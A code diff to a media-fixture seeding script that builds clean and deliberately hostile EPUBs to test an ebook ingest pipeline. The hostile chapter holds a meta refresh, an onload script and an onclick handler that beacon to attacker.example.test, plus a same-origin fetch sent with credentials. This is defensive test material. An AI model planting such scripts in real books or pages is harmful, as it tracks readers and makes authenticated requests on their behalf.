@@ -45,11 +45,15 @@ import {
 	workCaptionTracks,
 	workPages,
 	workPanels,
+	workSections,
+	workSourceFiles,
 	works,
 } from "@anthers/db/schema";
 import { type ProcessingKind, processingFor } from "@anthers/shared/content";
 import { rowsRatedAs } from "@anthers/shared/content-rating-fixtures";
 import { and, eq } from "drizzle-orm";
+import { strToU8, type Zippable, zipSync } from "fflate";
+import { ingestEbook } from "../jobs/ingest-ebook.js";
 import { processAudio } from "../jobs/process-audio.js";
 import { renderPaged } from "../jobs/render-paged.js";
 import { transcodeVideo } from "../jobs/transcode-video.js";
@@ -161,6 +165,188 @@ async function generatePdf(pages: number): Promise<string> {
 	await Bun.write(path, body + trailer);
 	return path;
 }
+
+/**
+ * The fixture's reflow books, as real EPUBs built in memory.
+ *
+ * 🚨 **They must be books the ingest would extract honestly.** The reader specs read the
+ * section/asset ladder the ingest produces, so the container here carries the structure
+ * `lib/epub.ts` expects — container.xml, an OPF with a spine, an EPUB 3 nav the titles
+ * come from — and the clean book's chapters carry enough prose to paginate across. The
+ * hostile book is the security test's subject: a script that beacons outward and
+ * same-origin if it ever runs, a meta refresh, an inline handler and an off-origin image.
+ */
+type EpubEntry = Zippable;
+
+const FIXTURE_CSS = "body { color: #222222; margin: 1rem; }\np { line-height: 1.6; }\n";
+
+/** One chapter's XHTML, well-formed; `extra` lands after the heading, verbatim. */
+function fixtureChapter(title: string, marker: string, extra: string[] = []): string {
+	const prose = Array.from(
+		{ length: 24 },
+		(_, i) => `<p>${marker} paragraph ${i + 1}: ${"lorem ipsum dolor sit amet ".repeat(8)}</p>`,
+	).join("\n");
+	const parts = [
+		'<?xml version="1.0" encoding="UTF-8"?>',
+		'<html xmlns="http://www.w3.org/1999/xhtml">',
+		"<head>",
+		`<title>${title}</title>`,
+		'<link rel="stylesheet" type="text/css" href="fixture.css"/>',
+		...extra,
+		"</head>",
+		"<body>",
+		`<h1>${title}</h1>`,
+		`<p>${marker}</p>`,
+		prose,
+		"</body>",
+		"</html>",
+	];
+	return parts.join("\n");
+}
+
+const FIXTURE_NAV = [
+	'<?xml version="1.0" encoding="UTF-8"?>',
+	'<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">',
+	"<head><title>Contents</title></head>",
+	"<body>",
+	'<nav epub:type="toc" id="toc"><ol>',
+	'<li><a href="title.xhtml">Title page</a></li>',
+	'<li><a href="ch1.xhtml">Chapter One</a></li>',
+	'<li><a href="ch2.xhtml">Chapter Two</a></li>',
+	"</ol></nav>",
+	"</body>",
+	"</html>",
+].join("\n");
+
+const FIXTURE_OPF = [
+	'<?xml version="1.0" encoding="UTF-8"?>',
+	'<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="book-id">',
+	'<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">',
+	'<dc:identifier id="book-id">urn:uuid:96c14f80-4b1e-4c7f-9c14-fixture-media</dc:identifier>',
+	"<dc:title>A book that really reflows</dc:title>",
+	"<dc:language>en</dc:language>",
+	"<dc:creator>Media Fixture</dc:creator>",
+	"</metadata>",
+	"<manifest>",
+	'<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>',
+	'<item id="css" href="fixture.css" media-type="text/css"/>',
+	'<item id="title" href="title.xhtml" media-type="application/xhtml+xml"/>',
+	'<item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>',
+	'<item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>',
+	"</manifest>",
+	"<spine>",
+	'<itemref idref="title"/>',
+	'<itemref idref="ch1"/>',
+	'<itemref idref="ch2"/>',
+	"</spine>",
+	"</package>",
+].join("\n");
+
+/** The hostile chapter: everything a scripted EPUB would try, in one body. */
+/** The scripted book's structural files differ from the clean one's by their file list. */
+const SCRIPTED_OPF = [
+	'<?xml version="1.0" encoding="UTF-8"?>',
+	'<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="book-id">',
+	'<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">',
+	'<dc:identifier id="book-id">urn:uuid:96c14f80-4b1e-4c7f-9c14-fixture-hostile</dc:identifier>',
+	"<dc:title>A book with hostile chapters</dc:title>",
+	"<dc:language>en</dc:language>",
+	"<dc:creator>Media Fixture</dc:creator>",
+	"</metadata>",
+	"<manifest>",
+	'<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>',
+	'<item id="css" href="fixture.css" media-type="text/css"/>',
+	'<item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>',
+	'<item id="outro" href="outro.xhtml" media-type="application/xhtml+xml"/>',
+	"</manifest>",
+	"<spine>",
+	'<itemref idref="ch1"/>',
+	'<itemref idref="outro"/>',
+	"</spine>",
+	"</package>",
+].join("\n");
+
+const SCRIPTED_NAV = [
+	'<?xml version="1.0" encoding="UTF-8"?>',
+	'<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">',
+	"<head><title>Contents</title></head>",
+	"<body>",
+	'<nav epub:type="toc" id="toc"><ol>',
+	'<li><a href="ch1.xhtml">Hostile chapter</a></li>',
+	'<li><a href="outro.xhtml">Closing words</a></li>',
+	"</ol></nav>",
+	"</body>",
+	"</html>",
+].join("\n");
+
+/** The hostile chapter: everything a scripted EPUB would try, in one body. */
+const HOSTILE_CH1 = [
+	'<?xml version="1.0" encoding="UTF-8"?>',
+	'<html xmlns="http://www.w3.org/1999/xhtml">',
+	"<head>",
+	"<title>Hostile chapter</title>",
+	'<link rel="stylesheet" type="text/css" href="fixture.css"/>',
+	'<meta http-equiv="refresh" content="0;https://attacker.example.test/via-refresh"/>',
+	"<style>p.fixture-hostile { background: red; }</style>",
+	"</head>",
+	"<body>",
+	"<h1>Hostile chapter</h1>",
+	"<script type=\"text/javascript\">window.addEventListener('load', function () {",
+	"  fetch('https://attacker.example.test/collect?via=external');",
+	"  fetch('/api/content/works?via=epub-script', { credentials: 'include' });",
+	"});</script>",
+	'<img src="https://attacker.example.test/pixel.png" alt=""/>',
+	"<p onclick=\"fetch('https://attacker.example.test/via-click')\">fixture-ebook-hostile-paragraph</p>",
+	"<p>fixture-ebook-scripted paragraph one: lorem ipsum dolor sit amet.</p>",
+	"</body>",
+	"</html>",
+].join("\n");
+
+/** The container's bytes, and their size (`fileSize` the sources table row carries). */
+function buildEpub(scripted: boolean): EpubEntry {
+	const entries: EpubEntry = {
+		mimetype: [new TextEncoder().encode("application/epub+zip"), { level: 0 }],
+		"META-INF/container.xml": strToU8(
+			'<?xml version="1.0"?>\n<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">\n<rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles>\n</container>\n',
+		),
+	};
+	if (scripted) {
+		entries["OEBPS/content.opf"] = strToU8(SCRIPTED_OPF);
+		entries["OEBPS/nav.xhtml"] = strToU8(SCRIPTED_NAV);
+		entries["OEBPS/ch1.xhtml"] = strToU8(HOSTILE_CH1);
+		entries["OEBPS/outro.xhtml"] = strToU8(
+			fixtureChapter("Closing words", "fixture-ebook-scripted-outro"),
+		);
+	} else {
+		entries["OEBPS/content.opf"] = strToU8(FIXTURE_OPF);
+		entries["OEBPS/nav.xhtml"] = strToU8(FIXTURE_NAV);
+		entries["OEBPS/title.xhtml"] = strToU8(
+			fixtureChapter("Title page", "fixture-ebook-title-page"),
+		);
+		entries["OEBPS/ch1.xhtml"] = strToU8(
+			fixtureChapter("Chapter One", "fixture-ebook-chapter-one"),
+		);
+		entries["OEBPS/ch2.xhtml"] = strToU8(
+			fixtureChapter("Chapter Two", "fixture-ebook-chapter-two"),
+		);
+	}
+	entries["OEBPS/fixture.css"] = strToU8(FIXTURE_CSS);
+	return entries;
+}
+
+const epubCache = new Map<boolean, Uint8Array>();
+
+/** The EPUB's bytes; cached, so `epubSize` and the upload agree without recompressing. */
+function generateEpub(scripted: boolean): Uint8Array {
+	let bytes = epubCache.get(scripted);
+	if (!bytes) {
+		bytes = zipSync(buildEpub(scripted));
+		epubCache.set(scripted, bytes);
+	}
+	return bytes;
+}
+
+const epubSize = (scripted: boolean) => generateEpub(scripted).length;
 
 async function generateClip(kind: "video" | "audio", hz: number): Promise<string> {
 	const path = join(
@@ -393,8 +579,8 @@ A tone, from the fixture that really plays.
 Still a tone.
 `;
 
-/** Whether this Work already has media we can trust, so the encode can be skipped. */
-async function alreadyPlayable(workId: number): Promise<boolean> {
+/** Whether a Work already carries the media its spec needs, so the encode/ingest can be skipped. */
+async function alreadyPlayable(workId: number, reflow: boolean): Promise<boolean> {
 	const [job] = await db
 		.select({
 			status: transcodingJobs.status,
@@ -405,6 +591,16 @@ async function alreadyPlayable(workId: number): Promise<boolean> {
 		.where(eq(transcodingJobs.workId, workId))
 		.limit(1);
 	if (job?.status !== "completed") return false;
+	// A reflow book's playable state is its extracted sections; a seeded EPUB that
+	// extracted has a full spine and the reader specs read the ladder from it.
+	if (reflow) {
+		const [row] = await db
+			.select({ id: workSections.id })
+			.from(workSections)
+			.where(eq(workSections.workId, workId))
+			.limit(1);
+		return row != null;
+	}
 	// A completed-from-before-the-rendition video is not playable in the sense the browser
 	// suite needs — the Podcast-This row is gated on `audio.m3u8` existing in storage,
 	// and a fixture seeded on an older branch has no such object. Re-encode it.
@@ -431,7 +627,7 @@ async function seedMediaFor(spec: MediaFixtureWork, creator: number): Promise<vo
 	const workId = await ensureWork(spec, creator);
 	await ensureVideoCaptions(spec, creator, workId);
 
-	if (!FORCE && (await alreadyPlayable(workId))) {
+	if (!FORCE && (await alreadyPlayable(workId, spec.media === "ebook"))) {
 		console.log(`${TAG} ${spec.key} already playable — skipped`);
 		return;
 	}
@@ -443,32 +639,61 @@ async function seedMediaFor(spec: MediaFixtureWork, creator: number): Promise<vo
 	// 440 Hz for the video, then a rising scale for the tracks, so a person listening to
 	// the queue can hear it advance.
 	const hz = processing === "video" ? 440 : 440 + spec.trackNumber * 110;
-	const clipPath =
-		processing === "ebook" ? await generatePdf(EBOOK_PAGES) : await generateClip(processing, hz);
+	// A reflow book's source is a real EPUB uploaded into the set — it goes through the
+	// real ingest, the same queue and the same caps an upload does, so the rows the
+	// reader specs read are the rows the pipeline produces.
+	const reflow = spec.media === "ebook";
+	const clipPath = reflow
+		? null
+		: processing === "ebook"
+			? await generatePdf(EBOOK_PAGES)
+			: await generateClip(processing, hz);
 	try {
 		const ext = processing === "video" ? "mp4" : processing === "ebook" ? "pdf" : "mp3";
-		const sourceKey = `creators/${creator}/${processing}/source/${randomUUID().replace(/-/g, "")}.${ext}`;
+		const sourceKey = reflow
+			? `creators/${creator}/ebook/source/${randomUUID().replace(/-/g, "")}.epub`
+			: `creators/${creator}/${processing}/source/${randomUUID().replace(/-/g, "")}.${ext}`;
 		// Sources are private: only derived, access-checked deliverables are ever served.
 		await storage.upload(
 			sourceKey,
-			new Uint8Array(await Bun.file(clipPath).arrayBuffer()),
+			reflow
+				? generateEpub(spec.scripted ?? false)
+				: new Uint8Array(await Bun.file(clipPath as string).arrayBuffer()),
 			processing === "video"
 				? "video/mp4"
-				: processing === "ebook"
-					? "application/pdf"
-					: "audio/mpeg",
+				: reflow
+					? "application/epub+zip"
+					: processing === "ebook"
+						? "application/pdf"
+						: "audio/mpeg",
 			"private",
 		);
 		await db.update(works).set({ sourceKey, updatedAt: new Date() }).where(eq(works.id, workId));
+
+		if (reflow) {
+			// A real set row, because the ingest reads the table through `listSourceFiles`
+			// — whose legacy-attach fallback hardcodes the PDF mime, which an EPUB must not
+			// inherit (`isEpubSource` would read it as a PDF and refuse the set).
+			await db.delete(workSourceFiles).where(eq(workSourceFiles.workId, workId));
+			await db.insert(workSourceFiles).values({
+				workId,
+				position: 0,
+				file: sourceKey,
+				filename: `${spec.key}.epub`,
+				fileSize: epubSize(spec.scripted ?? false),
+				mimeType: "application/epub+zip",
+			});
+		}
 
 		const [job] = await db
 			.insert(transcodingJobs)
 			.values({ workId, mediaType: processing, status: "pending", progress: 0 })
 			.returning({ id: transcodingJobs.id });
 
-		if (processing === "video") {
+		if (reflow) await ingestEbook({ jobId: job.id });
+		else if (processing === "video") {
 			await transcodeVideo({ jobId: job.id });
-			await seedVideoThumbnail(workId, creator, clipPath);
+			await seedVideoThumbnail(workId, creator, clipPath as string);
 		} else if (processing === "ebook") await renderPaged({ jobId: job.id });
 		else await processAudio({ jobId: job.id });
 
@@ -484,7 +709,7 @@ async function seedMediaFor(spec: MediaFixtureWork, creator: number): Promise<vo
 		}
 		console.log(`${TAG} ${spec.key} (${spec.slug}) → real ${spec.media}, work ${workId}`);
 	} finally {
-		await rm(clipPath, { force: true });
+		if (clipPath) await rm(clipPath, { force: true });
 	}
 }
 
